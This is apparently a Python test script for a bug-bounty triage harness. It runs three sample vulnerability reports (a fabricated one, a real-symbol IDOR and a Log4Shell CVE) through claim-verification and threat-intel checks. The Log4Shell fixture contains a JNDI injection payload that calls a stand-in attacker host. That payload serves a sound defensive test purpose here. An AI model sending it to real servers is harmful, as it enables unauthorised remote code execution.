"""Local end-to-end check of the defense harness (no model server required).

Forces the model endpoint unreachable so the transparent heuristic + the
ground-truth defense layers run: claim verification (fabricated symbols -> slop),
real-symbol support, and threat-intel corroboration (CVE -> corroborated_surge).

    uv run python test_harness_local.py
"""
import json
import os

os.environ["MODEL_BASE_URL"] = "http://127.0.0.1:9"  # discard port -> unreachable

from app import triage  # noqa: E402

CASES = {
    "fabricated_slop": {
        "title": "Critical RCE in acme via acme_exec_payload",
        "severity_claimed": "Critical",
        "asset": "acme.com",
        "description": "The function acme_exec_payload() lets an attacker run code. "
                       "It calls acme_secret_backdoor() internally to bypass auth.",
        "steps_to_reproduce": "Invoke acme_exec_payload with a crafted blob.",
        "impact": "Full remote code execution and total compromise.",
    },
    "real_symbol_idor": {
        "title": "IDOR in invoice download",
        "severity_claimed": "High",
        "asset": "api.acme.com",
        "description": "acme_invoice_get() does not check ownership, so any user can "
                       "fetch another tenant's invoice by changing the id.",
        "steps_to_reproduce": "GET /api/invoice/1002 while authenticated as user 1001.",
        "impact": "Cross-tenant disclosure of financial documents (IDOR).",
    },
    "cve_corroborated": {
        "title": "Log4Shell affects our logging service",
        "severity_claimed": "Critical",
        "asset": "logs.acme.com",
        "description": "The service is vulnerable to CVE-2021-44228 (Log4Shell).",
        "steps_to_reproduce": "Send ${jndi:ldap://attacker/x} in a logged header.",
        "impact": "Remote code execution via JNDI lookup.",
    },
}


def main() -> None:
    for name, sub in CASES.items():
        res = triage.run(sub)
        v = res["verdict"]
        ev = res["evidence"]
        print(f"\n===== {name} =====")
        print(f"engine            : {res['engine']}")
        print(f"disposition       : {v.get('disposition')}")
        print(f"severity_estimate : {v.get('severity_estimate')}")
        print(f"confidence        : {v.get('confidence')}")
        print(f"claim_reliability : {v.get('claim_reliability')}")
        print(f"corroboration     : matched={res['corroboration'].get('matched')} "
              f"in_kev={res['corroboration'].get('in_kev')}")
        print(f"evidence hint     : {ev.get('hint')}  "
              f"(supported={ev['n_supported']} refuted={ev['n_refuted']})")
        for c in ev["claims"]:
            print(f"   - [{c['status']:^12}] {c['evidence']}")
        print(f"reasoning         : {v.get('reasoning')[:200]}")


if __name__ == "__main__":
    main()
